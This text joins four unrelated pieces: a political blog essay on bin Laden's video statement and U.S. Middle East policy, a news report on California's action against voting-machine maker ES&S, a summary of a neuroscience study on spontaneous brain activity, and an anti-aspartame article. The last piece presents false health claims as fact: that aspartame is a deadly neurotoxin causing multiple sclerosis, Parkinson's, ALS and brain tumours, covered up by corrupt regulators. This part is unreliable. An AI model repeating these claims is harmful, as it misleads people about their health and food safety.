(6) Closely related to ( 5 ) above , U.S. support for what bin Laden asserts are apostate , corrupt , tyrannical governments in the Islamic world , as in Saudi Arabia , the Persian Gulf , Egypt , and North Africa .
In short , bin Laden does not rail against the U.S. and other Western countries because they are " free , " because they are " modern , " because they are " Christian , " or even because they purport to be " secular " ( though he asserts that Americans would be more happy if they were to adopt Islam ) .
He rails against them because of specific U.S. ( and allied ) policies -- military , political , and economic -- that he and his followers believe harm ordinary people in the Islamic World .
Bin Laden uses the imagery and vocabulary of Islam in making his points to his Arab and Islamic audience , much as George W. Bush , Joseph Lieberman , John Edwards , or Bill O'Reilly will use the imagery and vocabulary of the Judeo - Christian tradition to make points to their audiences .
But bin Laden is not a raving religious fanatic .
He is fundamentally a political revolutionary with a strong sense of suffered injustice , a sense which is shared by much of his audience and which he can therefore effectively manipulate for his political aims .
So is Osama bin Laden truly " evil ? "
Most people who lost family members at the World Trade Center on 9/11/2001 would probably consider him to be evil .
Was President Ronald Reagan evil ?
Most residents of Beirut who lost family members when the USS New Jersey rained 2,700 pound Mark 7 shells on residential neighborhoods in 1983 during the Lebanese Civil War probably considered Reagan to have been evil .
Bottom line ?
Bin Laden is no more evil than other revolutionary leaders in other times or even than ordinary national leaders who propel their countries to war for " national honor , " or to acquire the resources of others , or even to " do good . "
So if bin Laden , if looked at dispassionately and analytically , is neither absolutely " crazy " nor utterly " evil , " what is he ?
Bin Laden is a serious and wily adversary who knows how to manipulate the Arab " street . "
He is intelligent and well - informed -- clearly far better informed about the U.S. and the West than the apparatchiks and their bosses in the current White House are informed about him and his region of influence .
Bin Laden thinks strategically and takes the long view ; he is tactically flexible and is not afraid to retreat to attain an ultimate strategic advantage .
Unfortunately for the U.S. , he probably has a 40 point I.Q. advantage over the current occupant of the White House .
In short , we should not risk underestimating bin Laden by dismissing him out of hand as " crazy " and " evil . "
The Most Recent Video Statement : What Does bin Laden Seek ?
So what messages is bin Laden delivering in his latest video ?
You can read the English translation and decide for yourself .
Here are a few things which struck me as significant .
Bin Laden states that since the " ... 11th , ... many of America 's policies have come under the influence of the Mujahideen .... "
He asserts that America's :
... reputation worsened , its prestige was broken globally and it was bled dry economically , even if our interests overlap with the interests of the major corporations and also with those of the neoconservatives , despite the differing intentions .
Read that passage twice .
Perhaps we are missing something in the translation from the Arabic , but bin Laden appears to be stating that the interests of the Mujahideen overlap with the interests of major corporations and of neoconservatives .
How on earth could that be ?
Here are a few excerpts that illustrate this critically important point :
... there has been an increase in the thinkers who study events and happenings , and on the basis of their study , they have declared the approach of the collapse of the American Empire .
Among them is the European thinker who anticipated the fall of the Soviet Union , which indeed fell .
And it would benefit you to read what he wrote about what comes after the empire in regard to the United States of America .
I also want to bring your attention that among the greatest reasons for the collapse of the Soviet Union was their being afflicted with their leader Brezhnev , who was overtaken by pride and arrogance and refused to look at the facts on the ground .
The mistakes of Brezhnev are being repeated by Bush ....
The unnamed " European thinker " is of course Emmanuel Todd , who forecast the collapse of the Soviet Empire in his The Final Fall : An Essay on the Decomposition of the Soviet Sphere , published in 1976 .
Todd 's book on the crumbling Soviet sphere was remarkably prescient , and in 2002 he turned his attention to America 's global status in his After the Empire : The Breakdown of the American Order .
Todd 's argument , which has been much discussed among European intellectual and political elites , is that in the relatively near term America 's financial indiscipline and runaway consumption habits will result in a crash leading to a necessary 15 to 20 percent reduction in American living standards .
Todd reasons that the U.S. , despite its military prowess , simply lacks the power to enforce its hegemony everywhere it wishes and that its increasingly fragile , debt - dependent economy cannot sustain for long such an overreaching imperial policy .
Todd describes the U.S. as a " superpower living hand to mouth , " led by a ruling class " even more rudderless and clueless than its European counterparts , " and incapable of achieving its global aims through repeated applications of " theatrical micromilitarism . "
Todd argues that the disintegration of American hegemony already is in full swing , and he predicts that the Bush American Administration and its neocon theorists " will go down in history as the gravediggers of the American empire . "
( I diaried Todd 's analysis in April here at Daily Kos . )
Bin Laden 's thrust thus becomes clear : U.S. corporate interests ( presumably Big Oil , Big Guns , and various Big Contractors ) that benefit from the global " War on Terror , " as well as neoconservative ideologues who argue for U.S. military interventions in Islamic states to create a " new order " in the Middle East , ultimately serve the interests of the Mujahideen , who wish to drain the U.S. military and economy in order to bring about the collapse of the American Empire , just as they believe that their jihad against the Soviet Union in Afghanistan led directly to the collapse of the Soviet Empire .
From bin Laden 's and al Qaeda 's viewpoint , so far , so good .
In their view , U.S. policies and the U.S. military presence in the Middle East provided the tinder .
Bin Laden and al Qaeda have struck the match .
And now they seem to believe that the U.S. is pouring onto the flames the fuel with which it will scald and eventually incinerate its own military and economy .
Here is bin Laden 's analysis of the U.S. role in Iraq :
Then Bush talks about his working with al - Maliki and his government to spread freedom in Iraq but he in fact is working with the leaders of one sect against another sect , in the belief that this will quickly decide the war in his favor .
And thus , what is called the civil war came into being and matters worsened at his hands before getting out of his control and him becoming like the one who plows and sows the sea : he harvests nothing but failure .
What threats does bin Laden make or imply in his video statement ?
Here is a direct one :
The first is from our side , and it is to continue to escalate the killing and fighting against you .
This is our duty , and our brothers are carrying it out , and I ask Allah to grant them resolve and victory .
While Juan Cole correctly points out that bin Laden and al Qaeda have little influence on events in Iraq , Cole suggests -- mistakenly , I believe -- that bin Laden 's message is essentially a call for increased jihadi resistance to U.S. troops in Iraq .
In the overall context of the statement bin Laden seems rather to be looking at the conflict from a more global perspective -- not merely in Iraq , but certainly also in Afghanistan and anywhere that the right conditions exist .
Bin Laden elsewhere in his statement mentions the millions of displaced persons in Africa , a displacement he attributes to global warming brought about in large degree by " , , , emissions of the factories of the major corporations . "
It appears as though bin Laden may be signalling that he sees the chaos in East Africa as promising arena for escalating jihad .
Bin Laden criticizes the American electorate for returning Bush to power for a second term , and he asserts that by doing so , American voters gave Bush a " ... clear mandate from you - with your full knowledge and consent - to continue to murder our people in Iraq and Afghanistan . "
Translation : Americans share the guilt of their leaders , and all are therefore fair game for Mujahideen .
Bin Laden also mocks both the Democrats and the anti-war movement in the U.S. :
Those with real power and influence are those with the most capital .
And since the democratic system permits major corporations to back candidates , be they presidential or congressional , there should n't be any cause for astonishment - and there is n't any - in the Democrats ' failure to stop the war .
And you 're the ones who have the saying which goes , " Money talks . "
And I tell you : after the failure of your representatives in the Democratic Party to implement your desire to stop the war , you can still carry anti-war placards and spread out in the streets of major cities , then go back to your homes , but that will be of no use and will lead to the prolonging of the war .
Bin Laden has harsh criticism for the U.S. news media :
And ... your information media , during the first years of the war , lost its credibility and manifested itself as a tool of the colonialist empires , and its condition has often been worse than the condition of the media of the dictatorial regimes which march in the caravan of the single leader .
What does bin Laden call upon the U.S. to do ?
Convert to Islam .
Of course , it is unlikely that he makes this call from any sense of realism ; it appears more to be grandstanding to his " Base , " his audience in the Arab " street . "
Also , having called upon Americans to convert to Islam , he can claim that he has acted according to Islamic precepts before ordering further attacks .
Bin Laden does adopt some of the " leftist " rhetoric cited by Juan Cole .
Bin Laden asserts that :
... as you liberated yourselves before from the slavery of monks , kings , and feudalism , you should liberate yourselves from the deception , shackles and attrition of the capitalist system .
If you were to ponder it well , you would find that in the end , it is a system harsher and fiercer than your systems in the Middle Ages .
The capitalist system seeks to turn the entire world into a fiefdom of the major corporations under the label of " globalization " in order to protect democracy .
OK .
Now We Know How Osama bin Laden Thinks and What He Is Trying to Accomplish .
So What Can We Do About It ?
Even Michael
Scheuer , though he makes an extensive laundry list in Imperial Hubrisof remedies that could be tried , really does not offer a compelling , coherently strategic answer .
( Full disclosure : I have not read Scheuer 's second book , Through Our Enemies ' Eyes .
Maybe the best answer does lie there . )
But maybe we could start by not reflexively pouring more military fuel on political , economic , social , and cultural fires ?
Merely ratcheting up military pressure -- conventional ground , massive air strikes , or special forces -- against mainly indigenous insurgents embedded among local populations is simply not working .
Start by reflecting on the six policy issues identified by Michael Scheuer .
How many of these policies truly serve vital U.S. national interests ?
One could reasonably argue that cheap oil ( i.e. , No. 5 above ) is important to the U.S. economy .
However , if we accept the increasingly convincing data supporting the concept of Peak Oil , the prospect of ensuring cheap oil supplies for very much longer seems to be beyond reach .
The sooner we accommodate ourselves to this emerging reality of oil scarcity , the better .
So why not reframe the whole debate with an obvious question : is the current U.S. policy of interventionism to secure access to cheap oil ( by invading countries to secure drilling rights for ExxonMobil , Chevron , British Petroleum , and Royal Dutch Shell ) really less costly -- in terms of treasure and of blood -- than to refrain from military intervention ( except as a very last resort to ensure freedom of transit ) and to let the petroleum exporting countries and the petroleum importers arrive at mutually agreed prices for crude ?
And could we take a portion of the literally trillions of dollars devoted to seizing and occupying countries possessing oilfields , natural gas deposits , and pipeline rights - of - way and instead invest it in more efficient petroleum technologies ( encouraging a hybrid in every driveway ) and better yet , in alternative and renewable sources of energy ?
The U.S. would still need a robust Navy to discourage potential threats to vital shipping lanes and to prevent piracy ( No. 2 above ) .
Hence a naval ( and likely air ) presence in the Middle East would continue to serve U.S. interests .
But are imperial police actions , air - launched devastations , and festering occupations really solving any of our problems ?
The U.S. really is not very good at conducting such occupations successfully when faced with stiff indigenous opposition , as we have found out in Lebanon , Somalia , Iraq , and in a rapidly deteriorating Afghanistan .
The U.S. position in Iraq is deteriorating as well , with any conceivable satisfactory resolution no nearer now than in 2003 -- no matter how creatively Gen. David Petraeus , Lt. Gen. Raymond Odierno , and Brig . Gen. Kevin Bergner have sought to cook and obfuscate the numbers since the " surge " began .
The other major issue , of course , is Israel .
But what U.S. interest is served by indulging the Israeli Right and Far Right ( No. 1 above , and a key irritant throughout the Arab World ) ?
With probably several hundred nuclear weapons in its arsenal , Israel surely has a sufficiently credible nuclear deterrent to assure its continued existence .
Israel can take care of itself .
And with this kind of nuclear deterrent , should not reasonable Israelis be able to summon the confidence to engage the Palestinians and other neighbors to bring about a comprehensive Middle East peace settlement ?
Would it really be so inconceivable for Israelis to treat the Palestinians as respected neighbors rather than as untermenschen to be suppressed and dispossessed in perpetuity ?
And if Israel can return the Sinai to Egypt , why can it not return the occupied Golan Heights to Syria ?
As for the brittle Arab monarchies or more conventional dictatorships that the U.S. helps to prop up ( No. 6 above ) , why should we feel compelled to make extraordinary efforts to sustain them on life support ?
Why not let them sort things out and transform themselves as best they can ?
If the U.S. wishes to have any influence on the transformations , would it not be better to aspire to serve as a worthy model with some traits worth emulating , rather than as a too - eager interventionist seeking to impose its views and norms on alien cultures ?
Even if Osama bin Laden ends up serving as the revolutionary catalyst for some regime changes in the Islamic World , it will be the societies themselves that will reorganize , reconstruct , and manage themselves .
Bin Laden will never become some sort of menacing , all - powerful " Caliph , " and given the ethnic and national differences within the Arab and Islamic Worlds , neither will anyone else .
Such a threat is a bogeyman created by the willfully ignorant or the merely delusional .
The U.S. , if it is sensibly introspective about its true " vital " interests before its self - infliected wounds become critical , may yet manage to remain prosperous and survive as one great power among several .
But the U.S. simply cannot afford to behave like a global hegemon , especially an eagerly interventionist one , in perpetuity .
The U.S. economy cannot sustain such a role .
Is it not time to turn away from following bin Laden 's agenda , which , oddly enough ( as bin Laden himself observes ) is congruent with the neoconservative agenda and the corporatist agenda : seeking more U.S. military interventions in the Islamic world , resulting in more violent resistance to U.S. military occupations , more strain on the U.S. economy ( and perhaps even a structural breakdown ) , more fissures in U.S. alliances , and ultimately the collapse of the " American Empire ? "
Why is the U.S. playing a game with the rules set by Osama bin Laden ?
Are we truly stupid ?
California Secretary of State Debra Bowen has issued a statement ( PDF ) revealing that Election Systems & Software — the largest voting machine maker in the United States — illegally sold almost 1,000 uncertified voting machines to five counties .
A public hearing has been scheduled for September , at which time the evidence will be evaluated .
If found guilty , ES&S could be barred from doing business in the state for three years , forced to refund all of the money that the counties paid for the voting machines , and face penalties of up to nearly $ 10 million .
" ES&S sold nearly 1,000 voting machines in California without telling the counties that bought them that they had never been certified for use in this state , " said Bowen in an official statement .
" Given that each machine costs about $ 5,000 , it appears ES&S has taken $ 5 million out of the pockets of several California counties that were simply trying to follow the law and equip their polling places with certified voting machines . "
The ES&S AutoMARK Phase
One model was apparently certified for use in California in 2005 , but the subsequent AutoMARK Phase Two model was not .
Bowen says that Phase
Two models were sold to five counties even though they had n't even been certified by either the federal or California state governments .
Wired 's Threat Level blog spoke to Secretary of State spokeswoman Nicole Winger , who explained that the Phase Two models had stickers indicating federal certification despite the fact that they never passed federal inspection and that the stickers on the Phase Two machines were only intended to apply to the Phase One machines .
The question , Winger says , is whether or not ES&S applied the stickers by accident or with the deliberate intent to deceive state election officials .
" We are in the early stages of learning about the facts , " Winger told Wired .
" We do n't know who would have applied the A100 [ Phase One ] stickers to uncertified equipment . "
Bowen has previously advocated higher standards for voting machine security .
In March , Bowen proposed red team security testing for electronic voting machines .
The tests revealed serious vulnerabilities in all voting machines used in the state of California .
In response , Bowen conditionally recertified the machines despite the presence of severe and intractable flaws but limited the use of the most common models to one per polling place and established a broad set of requirements that the vendors would have to meet to limit the potential for security breaches and machine failure .
ES&S declined to participate in the red team tests , citing lack of preparedness .
As a result , the company 's Phase One machines have since been decertified and may no longer be sold in California either .
It looks like ES&S could face the same fate as Diebold in California , which was sued by the state in 2004 and temporarily banned from doing business in the state after installing uncertified software on voting machines .
A paper that recently appeared in the journal Neuron sets up an interesting dichotomy in describing how to view the function of the brain .
One option it presents is that the brain is an input - output device : give it a stimulus , and it will process it and respond .
The alternative view is that the brain is simply doing its own thing , and stimuli act to modulate its activity , rather than direct it .
Since the first perspective is an easier one to approach experimentally , it has received most of the attention , but the paper presents evidence that the alternative view should n't be ignored .
The experiments in the paper are built around two observations .
The first is that just about every measure of brain function detects spontaneous , organized activity even when the owner of the brain does n't appear to be doing anything — in fact , this kind of activity has been detected when people are under anesthesia .
The second key observation is that , even on the simplest tests , the same individual will perform differently when the test is repeated .
The authors simply asked if these two were linked : is human action influenced by spontaneous brain activity ?
The researchers focused on the somatomotor cortex , or SMC , as previous work has shown that the left and right SMC undergo coordinated spontaneous activity .
The experiments involved a test that only required activity in the left SMC : right - handed individuals were asked to watch a symbol , and press a button with their right hand when it vanished .
Due to the way the brain is wired , only the SMC on the left side will be active during this test .
As expected , there was a lot of variability in the results .
The standard deviation in the time for the button press was about 15 percent of the average time , and the force used to press the button also varied , with a standard deviation of about 20 percent of the average .
Using MRI imaging of blood flow , the researchers were able to detect both the activity involved with the button press , as well as the spontaneous background activity of the brain .
Because the left and right SMCs have coordinated spontaneous activity , the researchers were able to subtract the right 's activity from the left , which should ( in theory ) leave nothing but the signal involved in the button press behind .
The theory appeared to work .
The subtraction provided a much cleaner connection between the button press and brain activity in the left SMC .
Once spontaneous activity was accounted for , noise was down by 60 percent , and the signal to noise ratio in the experiments doubled .
Putting this another way , spontaneous activity accounted for about 60 percent of the variation between tests .
The authors say that these results show that spontaneous brain activity is more than simply a physiological artifact ; it helps account for some of the variability in human behavior .
In that sense , they argue for a greater acceptance of the view that our brain may have some intrinsic activity that 's somewhat independent of sensory input .

This article is an accumulation of long - standing intensive research into the brain chemistry - altering effects of a toxic , artificial sweetener consumed daily by hundreds of millions of unsuspecting individuals .
We acknowledge the countless and unnecessary suffering , illness , and deaths , associated with the marketing of a trio of neurotoxic ingredients , collectively known as ASPARTAME [ L - aspartyl - L - phenylalanine methyl ester ] , also called : NutraSweet , Equal , " Sugar Free " , and Neotame , et al . ... a food additive in over 8,000 + food products worldwide .
The three toxic ingredients of Aspartame are methanol ( wood alcohol ) , and phenylalanine and aspartic acid ; both the latter are amino acid isolates .
This article is for the education of the public at large , the physicians and health specialists who have the integrity and intellect to understand the implications of aspartame 's ingredients and the biochemical and pathological effects upon brain nerve cells and tissues , resulting in serious neuro - endocrine disorders and other symptomologies .
Additionally , we hold accountable the U.S. Food and Drug Administration ; G.D. Searle , the original maker of aspartame ; Monsanto ; and the numerous corrupted politicians , government officials , physicians , and health care organizations that have literally sold themselves for greed of wealth and power .
This was done knowingly , at the expense of the health of millions of infants , children , and adults who needlessly suffer the debilitating effects of this known neurotoxin .
We hope that all people will cease consumption of this deadly product and become self - educated in order to protect their own health against an array of marketed food and environmental toxins .
It is our hopes that all people will live healthier and more fruitful lives , and maintain the freedom and wisdom for choosing what they put in their mouths and feed their children .
PROTEIN AND AMINO ACIDS
Protein is nature 's building blocks of life .
Protein is used for producing and maintaining muscle , tissue , blood , hormones , enzymes including the body 's organs , skin , and for healing processes .
Proteins are large , complex organic compounds made up of many groups of amino acids linked together .
There have been twenty - two ( 22 ) amino acids identified as necessary for normal human growth and development .
The body can make fourteen ( 14 ) of these amino acids , and these are called non-essential amino acids .
The other eight ( 8 ) amino acids must be received through outside sources , as in the foods we eat .
These amino acids are called essential amino acids .
Proteins are broken down during the process of digestion .
These proteins are broken down over time into their component amino acids or into very small groups .
The amino acids are then used by the body for maintaining health .
Amino acids also play a key role in neurotransmission , solute concentration and balance ( especially in areas of the brain ) , cellular calcium pump ( gate ) effectors , production and expenditure of ATP ( the cell 's energy stores ) , and are involved in overall body nerve cell conduction systems .
The amino acids that are released into the blood stream are competitive .
This means that the various types of amino acids compete for attachment sites on enzymes and cell structures .
It is this competition , which restricts any one type of amino acid from becoming too dominant and causing an imbalance in the normal ratio of the different circulating or cellular amino acids .
The enzymes , which are located throughout the body , including the brain and nerve cells , are responsible for ensuring that the amino acids gets to their proper end destination to be utilized by the body tissues .
Many key factors , including food additive excitotoxins and environmental poisons , play a role in nervous system degeneration .
Collected evidence and accumulated non-industry funded research leaves no doubt that the powerful excitotoxin , aspartame and its breakdown products , have a central or predominant role in creating or exacerbating neurodegenerative or neurocarcinogenic diseases .
AMINO ACID ISOLATES
The focus of our report , is an overview of excitotoxic effects upon brain chemistry due to Aspartame 's amino acid isolates .
Amino acid isolates have been artificially separated from the rest of the protein chain and are part of the Aspartame compound .
Aspartame is then added to foods during the manufacturing process .
Thus , these amino acids are by themselves ( isolated ) , as single or dipeptide molecules .
This is very different than the 80-300 amino acid chains that form natural proteins from dietary sources .
Some examples of genetically modified ( rDNA ) or manufactured amino acid isolates are glutamic acid or glutamate ( i.e. monosodium glutamate or MSG ) , aspartic acid or aspartate , and phenylalanine , among others .
The isolates differ from dietary ( with food ) amino acids because dietary amino acids are absorbed from the gut .
This depends upon the body 's digestive action to break down the long amino chains ( proteins ) and then to absorb them .
This means , that through the body 's regulation of metabolism , the proteins are broken down slowly , and always in the nutritious mix of other amino acids in the proper enzyme - regulated proportion for use by the body .
Following digestion of normal proteins , the broken amino acid chains are slowly released into the body .
Since they are in competition with one another for the enzyme sites , as earlier discussed , the body ensures that no one amino acid dominates the others .
Although , it has been noted that phenylalanine is the strongest competitor for many of these enzyme sites .
Moreover , the effect of a dosed amino acid isolate cannot be used in synthesis of proteins in the same manner as dietary amino acids , because the body requires the " variety of the mix " to prepare and manufacture proteins , including the availability of the different enzymes and intermediary structures .
The excitotoxic effects of glutamic acid isolates are well studied and widely known .
Some beneficial uses of amino acid isolates , such as L - lysine for use against oral herpes virus ( SI ) are also well known .
It is important to recognize the difference between natural , dietary amino acids , and pharmaceutically produced ( including rDNA ) amino acid isolates .
It is also important to recognize that the isolates of Aspartame are incorporated into a compound containing free methanol , a dangerous carcinogen and mutagen which readily breaks down into formaldehyde and formates inside the human body .
The hazards of ignoring the pharmacological nature of amino acid isolates are best illustrated by the Phenylalanine isolate that is 50 % by weight of Aspartame .
A can of soda pop yields about as much Phenylalanine as a large helping of beans .
NOTE : One ( 1 ) 12oz .
can of diet soda contains 200 mg of aspartame .
Phenylalanine = 100 mg = .50 % Aspartic Acid = 80 mg = .40 % Methanol = 20 mg = .10 %
ABOUT PHENYLALANINE :
The dietary Phenylalanine from the beans would only be harmful to the person with PKU ( phenylketonuria ) , a condition caused by one of several enzyme deficiencies .
This creates / allows increased plasma levels of Phenylalanine ( overload ) leading to the formation of destructive neurotoxic effects .
In healthy individuals , the fact that dietary Phenylalanine is in competition with the other amino acids and is absorbed slowly over ten to twenty hours from the digestive tract , makes it helpful rather than harmful for them .
In contrast , the Phenylalanine ( isolate ) from the can of aspartame - laced soda pop is absorbed in about five minutes .
This goes to the portal vein in the liver , with virtually no other competitive amino acids .
Amino acid release from the liver is through an enzyme - linked channel .
Without any competition , this Phenylalanine is released into the blood stream as an overwhelming bolus , or flood .
Even when ingested with foods , aspartame substantially increases the plasma phenylalanine ( and aspartic acid ) levels , due to their pharmaceutical make - up as isolates , and due to phenylalanine 's strong competitive affinity for the enzyme mediators and transmitter catalysts .
Synergistic damage also results from the absorption - metabolism sequence of methanol --> formaldehyde --> formic acid .
Methanol and formaldehyde are carcinogenic and mutagenic , and alter mitochondrial DNA as well as nucleic DNA through the formed adducts of these metabolic poisons .
This may be a strong initiator of disease states because the damaged DNA may not allow the cell to function properly or maintain homeostasis .
EXCITOTOXIC AMINO ACIDS ' PATHWAY TO THE BRAIN
Background : THE BRAIN
The brain , on an anatomical level , is an integrated network of nerve cells , support cells ( astrocytes , oligodendrocytes , et al ) , and is the controller for nerve - endocrine coordinating functions and its feedback network .
The brain controls the body 's endocrine system through nerve transmission , which centers on the functionality of the hypothalamus and pituitary gland .
This includes the nerve - endocrine coordination of the pancreas and secretions of the adrenals , thyroid , and gonads .
This , in turn , acts upon the brain and pituitary and on the tissues throughout the body .
This tightly controlled system produces a wide range of effects for proper functioning of the human organism .
Some hormone effects are used for development of the organism , from conception through birth .
Some are long lasting .
Many are a permanent element for life .
Hormones can be initiated during maturity .
Some hormones act later in adult life and can signify changes in brain function , or are associated with disease states or aging .
Nerve - endocrine functions can also act upon aspects of human behavior .
This integrated system signals you when you are hungry , or upset .
The overall health of this system affects learning , cognitive reasoning , controls your temperature , allows you to smell fresh - baked chocolate chip cookies , stimulates growth , oversees your heart rate , and is necessary for all the life functions enjoyed and needed by the individual .
The Brain , in effect , is the " Chief Operating Officer " of your physical body .
__________________________________________________
There are two avenues or pathways to furnish nutrients , oxygen , and other selective chemicals to the brain .
These are via the Blood Brain Barrier ( BBB ) and / or the Cerebral Spinal Fluid ( CSF ) .
The Blood Brain Barrier is similar , in some ways , to the blood vascular network in the other parts of the body .
The Blood Brain Barrier resembles normal capillaries , with a few exceptions .
The body 's capillaries , outside of the brain , are more permeable ( porous ) to fluids , ions , and other molecular structures because there are very minute spaces between the cells making up the capillary walls .
The brain 's capillary system ( blood brain barrier ) , on the other hand , are composed of tightly packed cells or " junctions " which reduce their permeability and eliminates the bulk flow of solutes through them .
Because of the tight junctions between the blood brain barrier 's capillary cells , there are two specialized ways that nutrients and other molecules can gain access to brain cell components and neurons .
These pathways are : 1 ) lipid mediation or 2 ) catalyzed ( active carrier ) transport .
The lipid transport system is confined to the transfer of small molecules to the brain tissue , and generally are proportional to their lipid solubility .
The catalyzed transport system includes both receptor and carrier mediating enzyme processes in order to provide the brain with nutrients ( glucose , amino acids , and nucleosides , etc . )
DIAGRAM #1 : The Blood Brain Barrier - capillary structure and adjacent nerve cell structures .
Another function of the blood brain barrier is to isolate the brain from toxic products and certain chemicals that could disrupt the delicate balance of ions , nutrients , and neurotransmitter substances that are used by the brain 's nerve cells .
When Aspartame is ingested and enters the blood stream , the three toxins of aspartame are " launched " throughout the body very rapidly .
Following consumption of aspartame - laced products , the phenylalanine flood overpowers the enzyme systems of the brain , setting off an induced PKU effect .
This induced PKU affect occurs by grossly overwhelming those enzymes required to reduce the circulating phenylalanine for use in other metabolic reactions .
This " overdose " of the competitive phenylalanine isolate ( and aspartic acid ) incapacitates the enzyme actions which controls several types of neurotransmitters ( and their precursor amino acids ) reducing dopamine and serotonin production .
The excitotoxin's effects creates secondary components which are also destructive in nature to the sensitive , surrounding neural tissues , including a breakdown by - product of phenylalanine called , diketopiperazine ( DKP ) which instigates tumor generation , especially that of the aggressive glioblastoma .
Further neuron insult is added due to the destruction and mutation of nucleic and mitochondrial DNA from the known carcinogenic properties of the methanol --> formaldehyde --> formic acid components .
The other avenue of delivering nutrients and other necessary molecules to the brain 's cell structures is by way of the Cerebral Spinal Fluid ( CSF ) .
There is a structure called the ' Choroid Plexus " which is a specialized arterio-venous capillary bed located within the lateral ventricles of the cerebral hemispheres that secretes the cerebral spinal fluid .
( See Diagrams # 2 and # 3 )
The cerebral spinal fluid is a clear , colorless liquid that circulates around the brain and spinal cord and baths the tissue with needed nutrients and other constituent molecules .
DIAGRAM # 2 :
DIAGRAM # 3 :
The brain is seen to contain four cavities within it .
The cerebrum holds two large Lateral Ventricles that connect at the midline .
From here , the CSF follows the InterVentricular Foramina into the Third Ventricle .
Here , at the Third Ventricle , another Choroid Plexus adds additional CSF .
The CSF then passes through the Aqueduct of Sylvius , continuing into the Fourth Ventricle , located between the cerebellum and brainstem .
Here , still another Choroid Plexus at the roof of the Fourth Ventricle contributes additional CSF fluid .
After leaving the Fourth Ventricle , the CSF essentially flows backward and downward around the midbrain , exiting the ventricular network below the cerebellum .
Some of the CSF passes downward into the Spinal SubArachnoid Space ( circulating around the spinal cord ) , and a portion rises upward , through the Tentorial Notch , spreading over the hemispheres of the brain .
Re-absorption of CSF is predominantly assumed through the lymph and blood capillary network of the subarachnoid space covering the cerebral hemispheres and spinal canal .
VENTRICLE NETWORK :
DIAGRAM # 4 :
The nutrients supplied by the CSF are delivered by diffusion into those structures adjacent to the CSF .
This leads to some specialized circumstances .
First , as the CSF diffuses nutrients ( or toxins ) to these adjacent structures , there becomes less and less concentrations of these molecules remaining within the CSF , as it continues along its track .
If toxins are present within the CSF , those structures first contacted are far more severely attacked by these toxins ( or excitotoxins ) , than those bathed in CSF farther away from the ventricular system and choroid plexus .
Second , diffusion of chemicals is greatly increased by increases in hydrostatic pressures or flow rates .
Third , inflammation of the Aqueduct of Sylvius from repeated insults of neurotoxic chemicals contained within the CSF , can cause narrowing of this duct , resulting in obstruction and the onset of adult hydrocephalus .
It is in the CSF , where the phenylalanine and dicarboxylic aspartic acid diffuses , setting off a chain reaction of repeated excitatory stimuli of surrounding nerve cells and neuronal structures adjacent to the flow route of the CSF .
This eventually leads to nerve cell necrosis ( cell death ) in these areas .
The hypothalamus sits adjacent on either side of the Third Ventricle , where there is a high diffusion rate from the CSF , leading to sustained and potentially extreme damage to this neuro - endocrine structure , one of the most vital neural systems in the body .
DIAGRAM # 5 :
A ( simplistic ) sequence of events would be the following :
The transport of excitotoxins across the blood brain barrier and within the CSF causes several reactions to occur .
1 ] The excitotoxins stimulate the nerves to fire excessively .
2 ]
The normal enzyme actions required to offset the induced , repeated firing of these neurons are negated by the phenylalanine and aspartic acid .
Furthermore , 3 ] the energy system for the required enzyme reactions becomes compromised from : 4 ] depleted intracellular ATP stores , 5 ] the presence of formaldehyde , 6 ] altered intracellular Ca+ uptake , 7 ] damage to cellular mitochondria , 8 ] destruction of the cellular wall , and 9 ] the subsequent release of free radicals .
This potentiates 10 ] oxidative stress and neurodegeneration .
These toxic by - products initiate secondary damage , which increases capillary permeability , continuing to destroy the surrounding nerve and glial cells .
This further impedes enzyme reactions , and 11 ] promotes DNA structural defects .
Cellular death occurs over the next 1 to 12 hours .
This does not include the long - term or cumulative effects of formaldehyde adducts and other metabolites .
The dead cells leave behind lesions , or holes , as Dr. Olney discovered with tests he conducted .
Evidence indicates that the following disease states can be clinically identified by their corresponding anatomic nerve fiber , or nerve bundle damage :
a ) Aqueduct of Sylvius = Hydrocephalus b)
White matter bundles = Multiple Sclerosis ( MS ) c) Pyramids / Basal Ganglia = Parkinson's Disease d) Lateral corticospinal tracts of spinal cord and bulbar nuclei =
Amyotrophic lateral sclerosis ( Lou Gehrig's ) e) Destruction of hypothalamic regions =
Neuro - endocrine disorders , obesity , psychogenic disorders ( behavior , anger ) malfunction of autonomic nervous system , immune suppression , et al .
( See Diagram # 5 , above )
Above the Fourth Ventricle , lay the pyramids , and slightly forward are the basal ganglia .
With powerful insults from excitotoxic stimulation , we develop clinical manifestations of Parkinson 's disease ( See Diagram # 6 ) .
This is further complicated by the depletion of the neurotransmitter , dopamine , resulting from the obliteration of enzyme sites by the flood of these excitotoxins .
Parkinson 's Disease , itself , is a complex chronic brain disorder resulting primarily from progressive death of a specific group of nerve cells in a layer of a region of the substantia nigra ( basal ganglia ) in the midbrain .
DIAGRAM #6 :
These nerve cells produce a chemical neurotransmitter called dopamine ( which is inhibited by the phenylalanine / aspartic acid isolates of aspartame ) .
The dopamine enables communication with receptors on neurons in a region of the brain called the striatum .
Additional dopamine pathways run from the midbrain to the limbic area and to the cerebral cortex .
The striatum includes three structures : globus pallidus , putamen and caudate nucleus .
( See Diagram 7 , below )
The striatum is a part of the brain involved with regulating the intensity of coordinated muscle activity such as movement , balance and walking .
Insufficient levels of dopamine from the neurons of the substantia nigra synapsing on neurons in the striatum is believed to be responsible for the primary symptoms of Parkinson's .
View of Brain structures affected by Parkinson 's ( and surrounding structures )
DIAGRAM # 7 :
As with Parkinsonian , Amyotrophic Lateral Sclerosis ( ALS ) , commonly called Lou Gehrig 's Disease , clearly represents a connection between nerve damage and the presence of excitotoxic amino acids .
Amyotrophic Lateral sclerosis , or ALS , is a progressive , degenerative disease resulting from damage or destruction of motor neurons within the brain and spinal cord .
Nerve cell destruction impairs or prevents muscle movement that corresponds to the affected neurons .
The various types of ALS include " bulbar " , which affects the cranial nerves , creating complications with speech and swallowing , et al .
When the damaged neurons extend from the spinal cord to muscle fibers , this is often termed motor neuron disease .
There can also be various combinations of these degenerative states .
Effects of the excitatory amino acid , glutamate , have been observed in the brain and spinal cord .
There is an increase of this excitotoxin within the CSF .
Additionally , the damaged areas of the cerebral cortex and spinal cord fail to " uptake " this neurotransmitter substance , leaving higher amounts in the extracellular space , causing notable cellular damage due to its excitatory properties .
NOTE : Aspartate ( aspartic acid ) is similar to glutamate and reacts with many of the same enzyme structures .
Also noted , are pathologies related to cellular calcium ( Ca + ) channels , which are altered by the presence of glutamate or aspartate .
Calcium changes may cause further deterioration by triggering secondary antibody effects that react to this damage .
